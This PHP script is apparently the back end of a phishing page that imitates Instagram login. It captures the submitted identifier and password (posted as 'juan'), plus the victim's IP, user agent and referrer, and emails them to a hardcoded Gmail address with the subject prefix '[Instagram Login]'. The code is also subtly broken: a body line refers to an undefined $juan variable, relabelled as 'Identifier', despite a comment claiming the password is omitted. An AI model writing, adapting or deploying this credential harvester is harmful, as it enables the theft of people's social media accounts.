<?php
declare(strict_types=1);

header('X-Content-Type-Options: nosniff');

// Configure your recipient email
$RECIPIENT = 'laouziazzedine@gmail.com';
$SUBJECT_PREFIX = '[Instagram Login] ';
$DEFAULT_FROM = 'no-reply@localhost';

function isPost(): bool {
    return ($_SERVER['REQUEST_METHOD'] ?? '') === 'POST';
}

function sanitizeText(?string $v): string {
    $v = $v ?? '';
    $v = trim($v);
    $v = strip_tags($v);
    return $v;
}

function sanitizeEmail(?string $v): ?string {
    $v = sanitizeText($v);
    if ($v === '') return null;
    $email = filter_var($v, FILTER_VALIDATE_EMAIL);
    return $email === false ? null : $email;
}

function headerSafe(string $v): string {
    // Prevent header injection
    return str_replace(["\r", "\n"], ' ', $v);
}

function wantsJson(): bool {
    $accept = $_SERVER['HTTP_ACCEPT'] ?? '';
    $xhr = $_SERVER['HTTP_X_REQUESTED_WITH'] ?? '';
    return stripos($accept, 'application/json') !== false || strtolower($xhr) === 'xmlhttprequest';
}

function respond(bool $ok, string $message, array $extra = []): void {
    if (wantsJson()) {
        header('Content-Type: application/json; charset=UTF-8');
        echo json_encode(['ok' => $ok, 'message' => $message] + $extra);
    } else {
        header('Content-Type: text/html; charset=UTF-8');
        echo "<!doctype html><meta charset='utf-8'><title>Form Submission</title>";
        echo "<p>" . htmlspecialchars($message, ENT_QUOTES, 'UTF-8') . "</p>";
    }
    exit;
}

if (!isPost()) {
    respond(false, 'Invalid request method.');
}

if (!filter_var($RECIPIENT, FILTER_VALIDATE_EMAIL)) {
    respond(false, 'Recipient email is not configured correctly.');
}

// Instagram login fields
$identifier = sanitizeText($_POST['identifier'] ?? '');
$password   = sanitizeText($_POST['juan'] ?? '');

// If identifier looks like an email, use it for Reply-To
$senderEmail = sanitizeEmail($identifier);

// Build subject safely
$subjectRaw = $identifier !== '' ? "Login attempt: {$identifier}" : 'New Login Attempt';
$subject    = mb_encode_mimeheader($SUBJECT_PREFIX . $subjectRaw, 'UTF-8');

// Assemble body (omit password for security)
$bodyLines = [];
$bodyLines[] = "Identifier: " . ($identifier !== '' ? $identifier : '(empty)');
$bodyLines[] = "Identifier: " . ($juan !== '' ? $juan : '(empty)');
$bodyLines[] = "";
$bodyLines[] = "Meta:";
$bodyLines[] = "Time: " . gmdate('c');
$bodyLines[] = "IP: " . ($_SERVER['REMOTE_ADDR'] ?? '');
$bodyLines[] = "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? '');
$bodyLines[] = "Referrer: " . ($_SERVER['HTTP_REFERER'] ?? '');
$body = implode("\r\n", $bodyLines) . "\r\n";

// Email headers
$headers = [];
$headers[] = 'MIME-Version: 1.0';
$headers[] = 'Content-Type: text/plain; charset=UTF-8';
$headers[] = 'From: ' . headerSafe($senderEmail ?? $DEFAULT_FROM);
if ($senderEmail) {
    $headers[] = 'Reply-To: ' . headerSafe($senderEmail);
}
$headersStr = implode("\r\n", $headers);

// Send
$ok = @mail($RECIPIENT, $subject, $body, $headersStr);

if ($ok) {
    respond(true, 'Login data sent via email.');
} else {
    // Helpful diagnostics for XAMPP/Windows where mail() often needs SMTP config
    $info = [
        'hint' => 'Configure SMTP in php.ini for mail() or use an SMTP library.',
        'php_ini' => ini_get('sendmail_path') ?: ('SMTP=' . ini_get('SMTP') . '; smtp_port=' . ini_get('smtp_port')),
    ];
    respond(false, 'Failed to send email via mail().', $info);
}
